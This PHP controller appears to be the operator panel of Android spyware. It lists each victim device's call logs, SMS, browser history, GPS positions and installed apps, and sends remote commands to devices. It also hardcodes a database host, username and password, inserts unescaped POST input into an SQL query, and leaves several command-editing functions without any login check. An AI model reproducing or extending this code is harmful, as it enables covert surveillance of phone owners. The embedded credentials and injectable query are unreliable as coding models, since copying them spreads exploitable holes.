<?php
class Admin extends CI_Controller{
	
	public function __construct()
	{
		parent::__construct();

		$this->output->set_header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
		$this->output->set_header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
		$this->output->set_header('Cache-Control: post-check=0, pre-check=0', FALSE);
		$this->output->set_header('Pragma: no-cache');

		$this->load->model('admin_model');
		$this->load->helper('url');
	}

	function index(){
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
						redirect('admin/home');
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
	}

	function login(){
		$res = $this->admin_model->loginchk();

		if($res == 1){
			$data = array(
	                   'user'  => $_POST['username'],
						'type'  => 'admin',									
	                   'logged_in'  => TRUE
	                );				        
			$this->session->set_userdata($data);

			$userdata['users'] = $this->admin_model->getusers();
			$userdata['cmd'] = $this->admin_model->getcmd();
			
			$this->load->view('admin/header_admin');
			$this->load->view('admin/home',$userdata);
		}
		else{
			$this->load->view('admin/login');
		}
	}

	function logout()
	{
	    $this->session->unset_userdata('user');
		$this->session->unset_userdata('logged_in');
		$this->session->unset_userdata('type');
		$this->session->sess_destroy();
		redirect('admin');
	}

	function home()
	{
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
				$userdata['users'] = $this->admin_model->getusers();
				$userdata['cmd'] = $this->admin_model->getcmd();

				$this->load->view('admin/header_admin');
				$this->load->view('admin/home',$userdata);
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
		//$today = date("Y-m-d");
		//echo $today;
	}

	function viewdevice($id=false, $name=false, $number=false)
	{
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
				$userdata['users'] = $this->admin_model->getdevice($id,$name,$number);
				$userdata['users1'] = $this->admin_model->getsingledevice($id,$name,$number);
				$userdata['deviceid'] = $id;
				$userdata['devicename'] = $name;
				$userdata['devicenumber'] = $number;
				$userdata['cmd'] = $this->admin_model->getcmd();
				$userdata['calllog'] = $this->admin_model->getcalllog($id,$name,$number);
				$userdata['smslog'] = $this->admin_model->getsmslog($id,$name,$number);
				$userdata['browserlog'] = $this->admin_model->getbrowserlog($id,$name,$number);
				$userdata['gpslog'] = $this->admin_model->getgpslog($id,$name,$number);
				$userdata['packages'] = $this->admin_model->getpackages($id);

				$this->load->view('admin/header_admin');
				$this->load->view('admin/device',$userdata);
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
	}

	function addcommand($id=false, $name=false, $number=false)
	{
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
				$com = $_POST['command'];
				//echo $com . "<br>";

				$this->admin_model->addhistory($id,$com);

				$userdata['users'] = $this->admin_model->getdevice($id,$name,$number);
				$userdata['users1'] = $this->admin_model->getsingledevice($id,$name,$number);
				$userdata['deviceid'] = $id;
				$userdata['devicename'] = $name;
				$userdata['devicenumber'] = $number;
				$userdata['cmd'] = $this->admin_model->getcmd();
				$userdata['calllog'] = $this->admin_model->getcalllog($id,$name,$number);
				$userdata['smslog'] = $this->admin_model->getsmslog($id,$name,$number);
				$userdata['browserlog'] = $this->admin_model->getbrowserlog($id,$name,$number);
				$userdata['gpslog'] = $this->admin_model->getgpslog($id,$name,$number);
				$userdata['packages'] = $this->admin_model->getpackages($id);

				$this->load->view('admin/header_admin');
				$this->load->view('admin/device',$userdata);
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
	}

	function updatecontent($todo=false)
	{
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
				if (isset($GLOBALS["HTTP_RAW_POST_DATA"])){
					if($todo == "sendcmd"){
						$trimmed = trim($GLOBALS["HTTP_RAW_POST_DATA"], '[]');
						$prevarr = explode(",", $trimmed);  /// Stores cmd and ids

						$arr = explode("'*'", $prevarr[0]);
						$arr = str_replace('"', '', $arr);  /// IDs
						$cmd = str_replace('"', '', $prevarr[1]);  // cmd
						
						$ct = 0;
						foreach ($arr as $ids) {
							$this->admin_model->addhistory($ids,$cmd);
							$ct++;
						}
					}else{
						$trimmed = trim($GLOBALS["HTTP_RAW_POST_DATA"], '[]');
						$arr = explode("'*'", $trimmed);
						$arr = str_replace('"', '', $arr);
						//print_r($arr);

						foreach ($arr as $ids) {
							$this->admin_model->unreg($ids);
						}
					}			
				}

				$userdata['users'] = $this->admin_model->getusers();
				$userdata['cmd'] = $this->admin_model->getcmd();
				$this->load->view('admin/home',$userdata);
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
	}

	function help()
	{
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
				$this->load->view('admin/header_admin');
				$this->load->view('admin/help');
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
		//$today = date("Y-m-d");
		//echo $today;
	}

	function chat()
	{
		if ($this->session->userdata('logged_in') == TRUE)
	    {
	        if($this->session->userdata('type') == 'admin') {
				$this->load->view('admin/header_admin');
				
				if(isset($_POST['msg'])){
					$message = $_POST['msg'];
					$user = "admin";
					$ip = $_SERVER['REMOTE_ADDR'];
					$datum = date("[d-m - H:i]");
					$final = $datum . "<br />" . $message . "<br /><br />";

					$verbindung = mysql_connect("alexandroid.db.9664540.hostedresource.com", "alexandroid" , "Bifro7!23")
					or die("Verbindung zur Datenbank konnte nicht hergestellt werden.");

					mysql_select_db("alexandroid") or die ("Datenbank konnte nicht ausgewählt werden");
					$eintrag = "INSERT INTO chat_messages (chat_messages_id, user, message, ip, date) VALUES ('', '$user', '$message', '$ip', '$datum')";
					$eintragen = mysql_query($eintrag);
				}
				$this->load->view('admin/chat');
			}									
	    }
	    else{
			$this->load->view('admin/login');
		}
	}

	function addcmd(){
		if(isset($_POST['clm_cmdname'])){
			//print_r($_POST);
			$this->admin_model->addcmd($_POST);
		}

		//print_r($this->admin_model->getcmd());
		$this->load->view('admin/header_admin');
		$this->load->view('admin/addcmd');
	}

	function viewcmd($id=false){

		$data['cmd'] = $this->admin_model->getcmd();
		$data['id'] = 0;
		$this->load->view('admin/header_admin');
		$this->load->view('admin/editcmd', $data);
	}

	function editcmd($id=false){

		echo $id;
		$data['cmd'] = $this->admin_model->getcmd();
		//print_r($data['cmd']);
		$data['id'] = $id;
		$this->load->view('admin/editcmd', $data);
	}

	function updatecmd($id=false){

		if (isset($GLOBALS["HTTP_RAW_POST_DATA"])){
			$trimmed = trim($GLOBALS["HTTP_RAW_POST_DATA"], '[]');
			$arr = explode(",", $trimmed);
			$arr = str_replace('"', '', $arr);
			$this->admin_model->updatecmd($id,$arr);
			//print_r($arr);
		}

		$data['cmd'] = $this->admin_model->getcmd();
		$data['id'] = 0;
		$this->load->view('admin/editcmd', $data);
	}

	function deletecmd($id = false){
		$this->admin_model->deletecmd($id);

		$data['cmd'] = $this->admin_model->getcmd();
		$data['id'] = 0;
		$this->load->view('admin/editcmd', $data);
	}

}

?>